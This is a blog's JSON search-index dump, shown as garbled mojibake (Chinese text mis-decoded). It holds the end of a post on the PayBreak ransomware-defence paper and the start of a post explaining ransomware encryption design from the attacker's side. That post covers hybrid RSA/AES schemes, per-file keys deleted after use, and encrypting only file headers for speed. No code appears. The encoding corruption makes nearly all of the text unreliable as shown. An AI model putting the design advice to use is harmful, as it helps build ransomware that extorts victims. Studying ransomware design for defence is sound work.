å¯†æ–¹æ³•â€”â€”æ··åˆåŠ å¯†ã€‚æˆ‘ä»¬ç ”ç©¶ç¡®å®šäº†å¤§éƒ¨åˆ†çš„å‹’ç´¢è½¯ä»¶éƒ½å¿…é¡»åœ¨å—å®³è€…çš„ä¸»æœºä¸Šä½¿ç”¨å¯¹ç§°ä¼šè¯å¯†é’¥æ¥æ‰§è¡Œæ–‡ä»¶åŠ å¯†ï¼Œå› æ­¤PayBreakå®ç°äº†å¯†é’¥æ‰˜ç®¡æœºåˆ¶ï¼Œå°†ä¼šè¯å¯†é’¥å­˜å‚¨åœ¨å¯†é’¥åº“ä¸­å¹¶ä½¿ç”¨ç”¨æˆ·çš„å…¬å…±å¯†é’¥åŠ å¯†ï¼Œåªæœ‰ç”¨æˆ·çš„ç§é’¥æ‰èƒ½è§£é”è¯¥å¯†é’¥åº“ã€‚ä¸æ”¿åºœå¼ºåˆ¶çš„å¯†é’¥æ‰˜ç®¡ç³»ç»Ÿç›¸åï¼ŒPayBreakç¡®ä¿åªæœ‰åˆæ³•ç”¨æˆ·æ‰èƒ½è®¿é—®æ‰˜ç®¡çš„å¯†é’¥ã€‚æˆ‘ä»¬å¯¹107ä¸ªå‹’ç´¢è½¯ä»¶æ ·æœ¬è¿›è¡Œäº†æµ‹è¯•ï¼Œå¹¶è¯æ˜PayBreakå¯ä»¥æˆåŠŸåœ°ä»åäºŒç§ä¸åŒå‹’ç´¢è½¯ä»¶ç³»åˆ—æ‰€é€ æˆçš„æŸå®³ä¸­æ¢å¤ï¼ŒåŒæ—¶å…¶è¿è¡Œæ—¶å¼€é”€è¿œè¿œä½äºäººç±»çš„æ„ŸçŸ¥é˜ˆå€¼ï¼Œå› æ­¤å¯ä»¥åœ¨æ—¥å¸¸å·¥ä½œç¯å¢ƒé’Ÿä½¿ç”¨PayBreakã€‚æœ€åï¼ŒPayBreakå°†ä½œä¸ºä¸€ä¸ªå…¬å¼€å¯ç”¨çš„å¼€æºé¡¹ç›®å‘å¸ƒ[7]ã€‚ å‚è€ƒå‹’ç´¢è½¯ä»¶ç»“æ„ä¸åŠ å¯†æ¨¡å¼ç ”ç©¶ â†©P. Lestringant, F. GuihÂ´ery, and P.-A. Fouque. Automated identification of cryptographic primitives in binary code with data flow graph isomorphism. In Proceedings of the 10th ACM Symposium on Information, Computer and Communications Security, ASIA CCS â€™15, 2015. â†©Cryptographic Message Syntax (CMS) â†©Fine Free File Command â†©A. Kharraz, W. Robertson, D. Balzarotti, L. Bilge, and E. Kirda. Cutting the Gordian Knot: A Look Under the Hood of Ransomware Attacks. In Proceedings of the International Conference on Detection of Intrusions and Malware, and Vulnerability Assessment (DIMVA), volume 9148 of Lecture Notes in Computer Science, Milan, Italy, July 2015. Springer International Publishing. â†©L. Sun. Reform: A framework for malware packer analysis using information theory and statistical methods, 2010. â†©https://github.com/BUseclab/paybreak â†©","categories":[],"tags":[{"name":"å‹’ç´¢è½¯ä»¶","slug":"å‹’ç´¢è½¯ä»¶","permalink":"https://mundi-xu.github.io/tags/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6/"},{"name":"æ¶æ„è½¯ä»¶","slug":"æ¶æ„è½¯ä»¶","permalink":"https://mundi-xu.github.io/tags/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/"},{"name":"Hybrid Cryptosystem","slug":"Hybrid-Cryptosystem","permalink":"https://mundi-xu.github.io/tags/Hybrid-Cryptosystem/"},{"name":"å¯†é’¥å­˜å‚¨åº“","slug":"å¯†é’¥å­˜å‚¨åº“","permalink":"https://mundi-xu.github.io/tags/%E5%AF%86%E9%92%A5%E5%AD%98%E5%82%A8%E5%BA%93/"},{"name":"Windows Hooking","slug":"Windows-Hooking","permalink":"https://mundi-xu.github.io/tags/Windows-Hooking/"}]},{"title":"å‹’ç´¢è½¯ä»¶ç»“æ„ä¸åŠ å¯†æ¨¡å¼ç ”ç©¶","slug":"å‹’ç´¢è½¯ä»¶ç»“æ„ä¸åŠ å¯†æ¨¡å¼ç ”ç©¶","date":"2020-12-28T07:14:10.000Z","updated":"2021-01-01T14:41:17.901Z","comments":true,"path":"2020/12/28/å‹’ç´¢è½¯ä»¶ç»“æ„ä¸åŠ å¯†æ¨¡å¼ç ”ç©¶/","link":"","permalink":"https://mundi-xu.github.io/2020/12/28/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E7%BB%93%E6%9E%84%E4%B8%8E%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%A0%94%E7%A9%B6/","excerpt":"å¯¹å¸¸è§å‹’ç´¢è½¯ä»¶çš„æ¶æ„ä¸æ”»å‡»æ¨¡å¼çš„ç ”ç©¶ã€‚","text":"One of the best ways of learning how something truly works is to try to build it yourself. æœ¬æ–‡çš„ç›®çš„ä»…ä¸ºåˆ†äº«æœ‰å…³å‹’ç´¢è½¯ä»¶æ¶æ„è½¯ä»¶çš„çŸ¥è¯†ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºæ¶æ„ç›®çš„ã€‚ åŸºæœ¬åŠ å¯†ç±»å‹åœ¨å¯¹å‹’ç´¢è½¯ä»¶çš„ç ”ç©¶ä¸­æœ€é‡è¦çš„æ¦‚å¿µä¹‹ä¸€å°±æ˜¯å®ƒä½¿ç”¨çš„åŠ å¯†ç±»å‹ï¼Œå…¶ä¸­ä¸»æµå‹’ç´¢è½¯ä»¶å‡ä½¿ç”¨ä»¥ä¸‹ä¸¤ç§ï¼Œå…·ä½“å¯å‚é˜…å¯†ç å­¦ç›¸å…³æ–‡çŒ®ã€‚ å¯¹ç§°åŠ å¯† å¯¹ç§°åŠ å¯†æ˜¯å¤§å¤šæ•°äººéƒ½ç†Ÿæ‚‰çš„åŠ å¯†æŠ€æœ¯ï¼Œå…¶ä½¿ç”¨åŒä¸€ä¸ªå¯†é’¥æ¥åŠ å¯†æˆ–è§£å¯†æ•°æ®ï¼Œå¸¸ç”¨äºzipæ–‡ä»¶æˆ–Officeæ–‡æ¡£ä¹‹ç±»çš„åŠ å¯†ã€‚ éå¯¹ç§°åŠ å¯† éå¯¹ç§°åŠ å¯†çš„å…·ä½“å®ç°å¯èƒ½è¾ƒä¸ºéš¾ä»¥ç†è§£ï¼Œä½†å…¶åº”ç”¨è¿˜æ˜¯ç®€æ˜æ˜“æ‡‚çš„ã€‚ éå¯¹ç§°åŠ å¯†ç®—æ³•éœ€è¦ä¸¤ä¸ªå¯†é’¥ï¼šå…¬å¼€å¯†é’¥ï¼ˆpublickey:ç®€ç§°å…¬é’¥ï¼‰å’Œç§æœ‰å¯†é’¥ï¼ˆprivatekey:ç®€ç§°ç§é’¥ï¼‰ã€‚å…¬é’¥ä¸ç§é’¥æ˜¯ä¸€å¯¹ï¼Œå¦‚æœç”¨å…¬é’¥å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œåªæœ‰ç”¨å¯¹åº”çš„ç§é’¥æ‰èƒ½è§£å¯†ã€‚å› ä¸ºåŠ å¯†å’Œè§£å¯†ä½¿ç”¨çš„æ˜¯ä¸¤ä¸ªä¸åŒçš„å¯†é’¥ï¼Œæ‰€ä»¥è¿™ç§ç®—æ³•å«ä½œéå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚ éå¯¹ç§°åŠ å¯†ç®—æ³•å®ç°æœºå¯†ä¿¡æ¯äº¤æ¢çš„åŸºæœ¬è¿‡ç¨‹æ˜¯ï¼šç”²æ–¹ç”Ÿæˆä¸€å¯¹å¯†é’¥å¹¶å°†å…¬é’¥å…¬å¼€ï¼Œéœ€è¦å‘ç”²æ–¹å‘é€ä¿¡æ¯çš„å…¶ä»–è§’è‰²(ä¹™æ–¹)ä½¿ç”¨è¯¥å¯†é’¥(ç”²æ–¹çš„å…¬é’¥)å¯¹æœºå¯†ä¿¡æ¯è¿›è¡ŒåŠ å¯†åå†å‘é€ç»™ç”²æ–¹ï¼›ç”²æ–¹å†ç”¨è‡ªå·±ç§é’¥å¯¹åŠ å¯†åçš„ä¿¡æ¯è¿›è¡Œè§£å¯†ã€‚ç”²æ–¹æƒ³è¦å›å¤ä¹™æ–¹æ—¶æ­£å¥½ç›¸åï¼Œä½¿ç”¨ä¹™æ–¹çš„å…¬é’¥å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ï¼ŒåŒç†ï¼Œä¹™æ–¹ä½¿ç”¨è‡ªå·±çš„ç§é’¥æ¥è¿›è¡Œè§£å¯†ã€‚ å¦ä¸€æ–¹é¢ï¼Œç”²æ–¹å¯ä»¥ä½¿ç”¨è‡ªå·±çš„ç§é’¥å¯¹æœºå¯†ä¿¡æ¯è¿›è¡Œç­¾ååå†å‘é€ç»™ä¹™æ–¹ï¼›ä¹™æ–¹å†ç”¨ç”²æ–¹çš„å…¬é’¥å¯¹ç”²æ–¹å‘é€å›æ¥çš„æ•°æ®è¿›è¡ŒéªŒç­¾ã€‚å…¶ç›®çš„ä¸æ˜¯ä¸ºäº†ä¿å¯†ï¼Œè€Œæ˜¯è¯æ˜æ‚¨æ˜¯å‘é€è¯¥æ¶ˆæ¯çš„äººï¼ˆå°±åƒç­¾ååœ¨ç°å®ç”Ÿæ´»ä¸­ä¸€æ ·æœ‰æ•ˆï¼‰ã€‚ç”²æ–¹åªèƒ½ç”¨å…¶ç§é’¥è§£å¯†ç”±å…¶å…¬é’¥åŠ å¯†åçš„ä»»ä½•ä¿¡æ¯ã€‚éå¯¹ç§°åŠ å¯†ç®—æ³•çš„ä¿å¯†æ€§æ¯”è¾ƒå¥½ï¼Œå®ƒæ¶ˆé™¤äº†æœ€ç»ˆç”¨æˆ·äº¤æ¢å¯†é’¥çš„éœ€è¦ã€‚ å‹’ç´¢è½¯ä»¶ç›¸å…³åº”ç”¨è®©æˆ‘ä»¬è€ƒè™‘ä¸€ä¸‹æ­£å¸¸æƒ…å†µä¸‹è¢«å‹’ç´¢è½¯ä»¶æ„ŸæŸ“çš„æµç¨‹ã€‚å…¶payloadé€šè¿‡å¤šç§æ–¹å¼ï¼ˆé’“é±¼ï¼Œè½¯ä»¶æ¼æ´ç­‰ï¼‰ä¼ æ’­ï¼Œå¹¶åœ¨ç›®æ ‡è®¡ç®—æœºä¸Šè¿è¡Œä»è€ŒåŠ å¯†ç›®æ ‡çš„æ‰€æœ‰æ–‡ä»¶ã€‚ä¹‹åï¼Œç”¨å¼¹çª—æˆ–å…¶ä»–é†’ç›®çš„æ–¹å¼è¦æ±‚å—å®³è€…äº¤é’±ä»¥è·å–è§£å¯†æ–‡ä»¶çš„æ–¹æ³•ã€‚æ‰€ä»¥æˆ‘ä»¬åº”è¯¥æ€æ ·æ‰èƒ½åšåˆ°è¿™äº›å‘¢ï¼Ÿ æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªååº”è‚¯å®šæ˜¯å¯¹æ–‡ä»¶ä½¿ç”¨å¯¹ç§°åŠ å¯†ï¼Œä½†è¿™æ˜¯é”™è¯¯çš„ï¼Œå¹¶ä¸”ä»»ä½•ä¸€ä¸ªæ­£å¸¸çš„å‹’ç´¢è½¯ä»¶éƒ½ä¼šå‡ºäºä¸€ä¸ªé‡è¦åŸå› è€Œé¿å…è¿™æ ·åšã€‚å½“å‹’ç´¢è½¯ä»¶æ­£åœ¨åŠ å¯†å—å®³è€…çš„æ–‡ä»¶æ—¶ï¼ŒåŠ å¯†å¯†é’¥å°†éœ€è¦å‡ºç°åœ¨æŸä¸ªåœ°æ–¹ã€‚å¦‚æœä½¿ç”¨å¯¹ç§°åŠ å¯†ï¼Œåˆ™ç”¨äºåŠ å¯†çš„åŠ å¯†å¯†é’¥ä¹Ÿå¯ä»¥ç”¨äºè§£å¯†ã€‚è¿™æ„å‘³ç€åˆæ ¼çš„å–è¯ä¸“å®¶å¯ä»¥æ¢å¤æ„ŸæŸ“æœŸé—´ç”¨äºåŠ å¯†çš„å¯†é’¥ï¼Œç„¶åä½¿ç”¨å®ƒæ¥è§£å¯†æ–‡ä»¶ã€‚å½“ä½¿ç”¨éå¯¹ç§°åŠ å¯†æ—¶ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸åŒçš„å¯†é’¥è¿›è¡ŒåŠ å¯†å’Œè§£å¯†ï¼Œå› æ­¤ï¼Œåªè¦ç¡®ä¿è§£å¯†å¯†é’¥çš„å®‰å…¨ï¼Œå³ä½¿åœ¨å—å®³è€…è®¡ç®—æœºä¸­å­˜å‚¨åŠ å¯†å¯†é’¥ä¹Ÿä¸æ˜¯ä»€ä¹ˆå¤§é—®é¢˜ã€‚ æˆ‘ä»¬éœ€è¦è€ƒè™‘çš„å¦ä¸€ä»¶é‡è¦äº‹æƒ…æ˜¯ï¼Œä½œä¸ºæ”»å‡»è€…ï¼Œæˆ‘ä»¬éœ€è¦æ‹¥æœ‰å¯†é’¥ï¼Œä»¥ä¾¿å—å®³è€…å†³å®šæ”¯ä»˜èµé‡‘æ—¶è§£å¯†æ–‡ä»¶ã€‚ä½¿ç”¨å¯¹ç§°åŠ å¯†æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åœ¨äºŒè¿›åˆ¶ä»£ç ä¸Šå¯¹å¯†é’¥è¿›è¡Œç¡¬ç¼–ç ï¼ˆè€Œè¿™æœ‰å¤šç§æ–¹æ³•å¯ä»¥é€†è½¬ï¼‰ï¼Œæˆ–è€…å³æ—¶ç”Ÿæˆå®ƒï¼Œç„¶åä½¿ç”¨æŸç§æ–¹å¼å°†å…¶ä¼ è¾“åˆ°æ”»å‡»è€…çš„æœåŠ¡å™¨ï¼ˆè¿™ä¹Ÿæ˜¯ä¸€ä¸ªåä¸»æ„ï¼Œå› ä¸ºå®ƒå¯èƒ½åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­è¢«æˆªè·ï¼Œå¹¶ä¸”å¦‚æœç›®æ ‡è®¡ç®—æœºæ–­ç½‘ï¼Œå› ä¸ºæ²¡æœ‰å¯†é’¥ï¼Œæˆ‘ä»¬å°†æ— æ³•ä¸ºå—å®³è€…è§£å¯†æ–‡ä»¶ã€‚ï¼‰åƒè¿™æ ·çš„æ–¹æ¡ˆæ›¾åœ¨CryptoDefenseçš„ç¬¬ä¸€ä»£äº§å“ä¸­ä½¿ç”¨ï¼Œå¹¶å…è®¸å—å®³è€…è‡ªè¡Œè§£å¯†æ–‡ä»¶[1]ã€‚å› ä¸ºå¯†é’¥æ—¢åœ¨ç”Ÿæˆåä¼ è¾“åˆ°æœåŠ¡å™¨ï¼Œç¼ºåˆæ„å¤–çš„ç•™åœ¨äº†æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­ã€‚ è€Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬å¿…é¡»ä½¿ç”¨éå¯¹ç§°åŠ å¯†æ¥åŠ å¯†å—å®³è€…æ–‡ä»¶å—ï¼Ÿæˆ‘ä»¬å¯ä»¥ç”Ÿæˆä¸€ä¸ªå¯†é’¥å¯¹ï¼Œåœ¨ä»£ç ä¸Šå¯¹å…¬å…±å¯†é’¥è¿›è¡Œç¡¬ç¼–ç ï¼Œç„¶åç”¨è¯¥å¯†é’¥å¯¹æ‰€æœ‰å†…å®¹è¿›è¡ŒåŠ å¯†ï¼ˆå°†ç§æœ‰å¯†é’¥å¦¥å–„ä¿å­˜ï¼‰ï¼Ÿä¸ï¼Œæˆ‘ä»¬ä¸èƒ½ã€‚ å½“æ‚¨å°è¯•è¿™ä¹ˆå¹²æ—¶ï¼Œä¸€ä¸ªæ˜¾è€Œæ˜“è§çš„åŸå› å°±æ˜¯éå¯¹ç§°åŠ å¯†æ¯”å¯¹ç§°åŠ å¯†è¦æ…¢å‡ ä¸ªæ•°é‡çº§ã€‚å½“æ‚¨åŠ å¯†å—å®³è€…çš„ç¡¬ç›˜æ—¶ï¼Œæ‚¨éœ€è¦å°½å¿«åŠ å¯†æ‰€æœ‰å†…å®¹ã€‚å¦‚æœå®Œå…¨åŠ å¯†æ–‡ä»¶éœ€è¦è¦èŠ±è´¹å‡ åˆ†é’Ÿä»¥ä¸Šï¼Œé‚£ä¹ˆå—å®³è€…å¯èƒ½ä¼šæ³¨æ„åˆ°å…¶æ–‡ä»¶å·²è¢«åŠ å¯†ï¼Œè€Œè¿™æ—¶åªéœ€ç®€å•çš„å…³é—­è®¡ç®—æœºå³å¯ã€‚è¿™å°†ä½¿ä»–èƒ½å¤Ÿä»ç¡¬ç›˜é©±åŠ¨å™¨ä¸­ä¿æŠ¤å‰©ä½™çš„æ–‡ä»¶ã€‚ é‚£ä¹ˆæˆ‘ä»¬åº”è¯¥ä½¿ç”¨ä»€ä¹ˆå‘¢ï¼Ÿ æ··åˆåŠ å¯† ä¸ºäº†è§£å†³æ­¤é—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ··åˆæ–¹æ³•ã€‚å½“ç”Ÿæˆpayloadæ—¶ï¼Œæˆ‘ä»¬è¿˜å°†ç”Ÿæˆä¸è¯¥payloadç›¸å…³è”çš„ä¸€ç»„å…¬ç”¨/ä¸“ç”¨å¯†é’¥ã€‚æˆ‘ä»¬åœ¨è¯¥ç‰¹å®špayloadä¸­å¯¹â€‹â€‹å…¬é’¥è¿›è¡Œç¼–ç ï¼Œå¹¶ä¸”æ¯å½“å‘ç”Ÿæ„ŸæŸ“æ—¶ï¼Œpayloadéƒ½ä¼šç”Ÿæˆä¸€ä¸ªç”¨äºå¯¹ç§°åŠ å¯†çš„å¯†é’¥ã€‚åŠ å¯†åï¼Œæˆ‘ä»¬ä½¿ç”¨ç¡¬ç¼–ç çš„å…¬é’¥å¯¹å¯¹ç§°å¯†é’¥è¿›è¡ŒåŠ å¯†ï¼ˆå½“ç„¶ï¼Œæ˜æ–‡å­˜å‚¨çš„å¯¹ç§°å¯†é’¥ä¼šä»å†…å­˜/ç£ç›˜ä¸­é”€æ¯ï¼‰ã€‚è¿™ä¸ªåŠ å¯†çš„å¯¹ç§°å¯†é’¥è¢«ä¿å­˜åœ¨æœºå™¨ä¸Šçš„æŸä¸ªåœ°æ–¹ï¼Œå¹¶åœ¨èµé‡‘è®°å½•ä¸­è¦æ±‚å—å®³è€…æä¾›æ­¤å¯†é’¥ã€‚ ä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰å¦ä¸€ä¸ªé—®é¢˜ã€‚ å¯†é’¥å¤ç”¨å’Œé€‰æ‹©æ˜æ–‡æ”»å‡»é€‰æ‹©æ˜æ–‡æ”»å‡»ï¼šæ”»å‡»è€…åœ¨å¼€å§‹æ”»å‡»æ—¶å¯ä»¥é€‰æ‹©ä¸€äº›æ˜æ–‡ï¼Œå¹¶è·å–åŠ å¯†åçš„å¯†æ–‡ã€‚å¦‚æœæ”»å‡»è€…åœ¨æ”»å‡»ä¸­é€”å¯ä»¥æ ¹æ®å·²ç»è·å–çš„ä¿¡æ¯é€‰æ‹©æ–°çš„æ˜æ–‡å¹¶è·å–å¯¹åº”çš„å¯†æ–‡ï¼Œåˆ™ç§°ä¸ºé€‚åº”æ€§é€‰æ‹©æ˜æ–‡æ”»å‡»ã€‚å…¶æ˜¯ä¸€ç§åŠ å¯†æ”»å‡»ï¼Œå…¶ä¸­ï¼Œæ”»å‡»è€…åœ¨åŠ å¯†ä¹‹å‰å°±çŸ¥é“äº†æ˜æ–‡ï¼Œå¹¶ç»™å‡ºäº†è¶³å¤Ÿå¤§çš„åŠ å¯†æ–‡ä»¶æ ·æœ¬ï¼Œä»ç†è®ºä¸Šè®²ï¼Œå¯†é’¥å¯ä»¥ä»åŠ å¯†ç»“æœä¸­å¾—å‡ºã€‚å¤§å¤šæ•°æ–‡ä»¶çš„headerï¼ˆå…·æœ‰å·²çŸ¥æ ¼å¼ï¼‰éƒ½å¯èƒ½å‘ç”Ÿè¿™ç§æƒ…å†µã€‚å¦‚æœæˆ‘ä»¬åœ¨ç»™å®šæ¡ä»¶çš„æƒ…å†µä¸‹å¯¹æ‰€æœ‰æ–‡ä»¶ä½¿ç”¨ç›¸åŒçš„å¯†é’¥ï¼Œåˆ™ç†è®ºä¸Šå¯ä»¥æ¢å¤è¯¥å¯†é’¥ã€‚è¿™å®é™…ä¸Šæ­£æ˜¯DirCryptå‘ç”Ÿçš„äº‹æƒ…[2]ã€‚å…¶ç”±äºä¸åˆé€‚çš„å¯†ç å®ç°å’Œå¯†é’¥å¤ç”¨ï¼ŒåŠ å¯†è¿‡ç¨‹è¢«é€†è½¬äº†ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸ºæ¯ä¸ªæ–‡ä»¶ä½¿ç”¨ä¸åŒçš„å¯†é’¥æ¥è§£å†³æ­¤é—®é¢˜ã€‚æˆ‘ä»¬å¯ä»¥ä¸ºæ¯ä¸ªæ–‡ä»¶ç”Ÿæˆå¯¹ç§°å¯†é’¥æ¥å¯¹æ–‡ä»¶è¿›è¡ŒåŠ å¯†ï¼ŒåŒæ—¶ä½¿ç”¨payloadä¸­çš„å…¬å…±å¯†é’¥åŠ å¯†å¯†é’¥ï¼Œå°†åŠ å¯†çš„å¯¹ç§°å¯†é’¥å†™å…¥æŸä¸ªä½ç½®ï¼Œç„¶ååˆ é™¤æ˜æ–‡å¯¹ç§°å¯†é’¥ã€‚ è®¸å¤šå‹’ç´¢è½¯ä»¶éƒ½ä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œåœ¨è¿™ç§åŠ å¯†æ¨¡å¼ä¸­ï¼Œå®ƒä»¬ç”Ÿæˆä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«æ¯ä¸ªåŠ å¯†çš„æ–‡ä»¶åå’Œä¸å…¶å…³è”çš„åŠ å¯†çš„å…¬å…±å¯†é’¥ã€‚ä½¿ç”¨è§£å¯†å·¥å…·æ—¶ï¼Œå®ƒå°†è¯»å–æ–‡æœ¬æ–‡ä»¶ï¼Œä½¿ç”¨ç§é’¥è§£å¯†æ¯ä¸ªå¯†é’¥ï¼Œç„¶åä½¿ç”¨è§£å¯†åçš„å¯†é’¥è§£å¯†æ–‡æœ¬æ–‡ä»¶ã€‚ä½†æˆ‘ä»¬å°†ä½¿ç”¨ä¸€äº›ä¸åŒçš„ä¸œè¥¿ã€‚ æŠ€æœ¯è¯´æ˜ï¼šè¿™ç§ç±»å‹çš„æ”»å‡»å®é™…ä¸Šå¹¶ä¸å½±å“æˆ‘ä»¬å°†ä½¿ç”¨çš„å¯¹ç§°åŠ å¯†å¯†ç ï¼ˆAES-256ï¼‰ï¼Œå› ä¸ºé»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒå¯¹æ¯ä¸ªæ–‡ä»¶æµä½¿ç”¨ä¸åŒçš„éšæœºåˆå§‹åŒ–çŸ¢é‡ï¼ˆIVï¼‰ï¼Œä½†æˆ‘æƒ³è§£é‡Šä¸€ä¸‹è¿™ä¸ªé€‚ç”¨äºæ‰€æœ‰å‹’ç´¢è½¯ä»¶çš„æ¦‚å¿µã€‚å¦‚æœå‹’ç´¢è½¯ä»¶çš„å¼€å‘äººå‘˜çŠ¯äº†ä¸€ä¸ªé”™è¯¯ï¼Œè¿™å¯èƒ½ä¼šå¸®åŠ©æ‚¨æ¢å¤æ•°æ®ã€‚å®é™…ä¸Šï¼Œè¿™ç§æ”»å‡»å®é™…ä¸Šå¯èƒ½ä¼šå½±å“RSAåŠ å¯†ï¼Œå› ä¸ºå®ƒçš„æœ€åŸºæœ¬å½¢å¼ä¸æ˜¯éšæœºçš„ã€‚ä½†åœ¨æˆ‘ä»¬çš„æƒ…å†µä¸‹ï¼Œè¿™å°†ä¸æ˜¯é—®é¢˜ï¼Œå› ä¸ºæˆ‘ä»¬ä½¿ç”¨RSAåŠ å¯†çš„å”¯ä¸€æ–‡ä»¶æ˜¯AESåŠ å¯†å¯†é’¥ï¼Œå¹¶ä¸”å®ƒä»¬æ—¢ä¸æ„æˆè¦åˆ†æçš„å¤§æ ·æœ¬ä¹Ÿä¸æ˜¯åŒç±»æ ·æœ¬ï¼Œå¹¶ä¸”æˆ‘ä»¬å°†ä½¿ç”¨RSAåŠ ä¸Šæœ€ä½³éå¯¹ç§°åŠ å¯†å¡«å……ï¼Œå¯ä¸ºåŠ å¯†å¢åŠ éšæœºæ€§ã€‚ å¯¹æ¯ä¸ªæ–‡ä»¶ä½¿ç”¨ä¸åŒçš„å¯†é’¥çš„å¦ä¸€ä¸ªä¼˜ç‚¹æ˜¯å¯ä»¥åœ¨åŠ å¯†æ¯ä¸ªæ–‡ä»¶ååˆ é™¤è¯¥åŠ å¯†å¯†é’¥ï¼Œå› æ­¤ï¼Œå¦‚æœä»»ä½•å—å®³è€…è¯•å›¾æ¢å¤è¯¥å¯†é’¥ï¼Œä»–å°†åªèƒ½æ¢å¤ç”¨äºæœ€åä¸€ä¸ªæ–‡ä»¶åŠ å¯†çš„å¯†é’¥ã€‚å¦‚æœæˆ‘ä»¬å¯¹æ‰€æœ‰æ–‡ä»¶ä½¿ç”¨ç›¸åŒçš„å¯†é’¥ï¼Œåˆ™å¯ä»¥åœ¨åŠ å¯†è¿‡ç¨‹çš„ä»»ä½•éƒ¨åˆ†ä¸­æ¢å¤å¯†é’¥ï¼Œå¹¶ä¸”æ‰€æœ‰æ–‡ä»¶éƒ½æ˜¯å¯æ¢å¤çš„ã€‚ åŠ å¯†é€Ÿåº¦åœ¨å¯¹å‹’ç´¢è½¯ä»¶è¿›è¡Œç¼–è¯‘æ—¶ï¼ŒåŸå§‹ç‰ˆæœ¬ä½¿ç”¨äº†æˆ‘åˆ°ç›®å‰ä¸ºæ­¢æ‰€ä»‹ç»çš„æ‰€æœ‰åŠŸèƒ½ï¼Œä½†ç»“æœæœ‰äº›ä»¤äººå¤±æœ›ã€‚å½“ä½¿ç”¨32ä½å¯†é’¥ï¼ˆAES-256ï¼‰æ—¶ï¼Œåˆå§‹åŸºå‡†æµ‹è¯•æ˜¾ç¤ºåŠ å¯†é€Ÿåº¦çº¦ä¸ºæ¯åˆ†é’Ÿ1GBã€‚å½“ç„¶ï¼Œè¿™ç§é€Ÿåº¦åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå–å†³äºå—å®³è€…çš„ç¡¬ä»¶ï¼Œè€Œæˆ‘ä½¿ç”¨çš„æ˜¯VMï¼Œå› ä¸ºæˆ‘ä¸æƒ³æ„å¤–åœ°åŠ å¯†æˆ‘çš„å¼€å‘è®¡ç®—æœºï¼Œä½†æ˜¯èŠ±16åˆ†é’Ÿçš„æ—¶é—´æ¥åŠ å¯†ä¸€ä¸ªç®€å•çš„1TBç¡¬ç›˜æ˜¾ç„¶å¹¶ä¸åˆé€‚ã€‚ é‚£ä¹ˆï¼Œç°ä»£çš„å‹’ç´¢è½¯ä»¶æ˜¯å¦‚ä½•åœ¨å‡ ç§’é’Ÿå†…åŠ å¯†å‡ åƒå…†å­—èŠ‚çš„ä¿¡æ¯çš„ï¼Ÿç­”æ¡ˆåœ¨äºæ–‡ä»¶ç»“æ„ã€‚ å®é™…ä¸Šå¯¹æ­£å¸¸æ“ä½œç³»ç»Ÿè€Œè¨€ï¼Œå¹¶ä¸éœ€è¦åŠ å¯†æ•´ä¸ªæ–‡ä»¶å³å¯ä½¿å…¶ä¸å¯ç”¨ã€‚æ ¹æ®æ–‡ä»¶æ ¼å¼ï¼Œå¯¹headerå’Œå‰å‡ ä¸ªå­—èŠ‚è¿›è¡ŒåŠ å¯†å°±è¶³ä»¥ä½¿æ•´ä¸ªæ–‡ä»¶ä¸å¯è¯»ã€‚æˆ‘ä»¬å¯èƒ½å¯ä»¥åŠ å¯†æ¯ä¸ªæ–‡ä»¶çš„å‰5å…†å­—èŠ‚ã€‚å½“ç„¶ï¼Œä½¿ç”¨è¯¸å¦‚stringsä¹‹ç±»çš„ä¸œè¥¿ä»ç„¶å¯ä»¥è¯»å–è¯¸å¦‚txt / asciiæ–‡ä»¶ä¹‹ç±»çš„ç®€å•æ–‡ä»¶ï¼Œä½†æ˜¯å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™äº›æ–‡ä»¶çš„æƒé‡ä¸ä¼šè¶…è¿‡å‡ ä¸ªkbã€‚æ­¤å¤–ï¼Œå—å®³è€…æœ€çè´µçš„æ–‡ä»¶é€šå¸¸æ˜¯æ–‡æ¡£ï¼Œå›¾ç‰‡å’Œè§†é¢‘ã€‚å³ä½¿æ‚¨ä»ç„¶å¯ä»¥å°è¯•å¯¹éƒ¨åˆ†æ–‡ä»¶è¿›è¡Œå–è¯åˆ†æå¹¶æ¢å¤æŸäº›å†…å®¹ï¼Œä½†è¿™æ˜¯ä¸€ç§æ‰‹åŠ¨æ–¹æ³•ï¼Œéœ€è¦å¯¹æ¯ä¸ªå•ç‹¬çš„æ–‡ä»¶è¿›è¡Œæ“ä½œï¼Œè¿™ä¸€ç‚¹éƒ½ä¸å®ç”¨ã€‚ æ›´æ”¹æ–‡ä»¶çš„ç»“å°¾çš„æƒ³æ³•ä¹Ÿå¾ˆå¥½ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨ç»“å°¾å¤„æ·»åŠ å‡ ä¸ªç‰¹å®šç»“æ„æ¥åˆ©ç”¨è¿™ä¸€ç‚¹ã€‚ åˆå§‹åŒ–å‘é‡ï¼šä½¿ç”¨AESåŠ å¯†æ–‡ä»¶æ—¶ï¼Œæ‚¨éœ€è¦ä¸€ç§ç§°ä¸ºåˆå§‹åŒ–å‘é‡çš„ä¸œè¥¿ã€‚è¿™æ˜¯åœ¨åŠ å¯†è¿‡ç¨‹å¼€å§‹æ—¶ç”Ÿæˆçš„ã€‚ åŠ 